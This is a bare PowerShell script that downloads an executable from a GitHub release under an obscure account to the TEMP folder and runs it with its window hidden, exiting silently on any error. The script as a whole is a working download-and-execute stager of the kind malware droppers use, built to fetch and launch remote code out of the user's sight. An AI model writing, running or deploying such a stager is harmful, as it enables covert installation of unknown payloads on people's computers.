param (
    [string]$DownloadUrl = 'https://github.com/giasfelfebrehber/stuff/releases/download/1/release.exe',
    [string]$OutputPath = "$env:TEMP\release.exe"
)

function Download-FileFast {
    param (
        [string]$Url,
        [string]$Destination
    )

    try {
        $http = [System.Net.Http.HttpClient]::new()
        $stream = $http.GetStreamAsync($Url).Result
        $file = [System.IO.File]::OpenWrite($Destination)
        $stream.CopyTo($file)
        $file.Close()
        $stream.Close()
        $http.Dispose()
    } catch {
        exit 1
    }
}

function Run-Executable {
    param (
        [string]$FilePath
    )
    if (-Not (Test-Path $FilePath)) { exit 1 }
    try {
        Start-Process -FilePath $FilePath -Wait -WindowStyle Hidden
    } catch {
        exit 1
    }
}

Download-FileFast -Url $DownloadUrl -Destination $OutputPath
Run-Executable -FilePath $OutputPath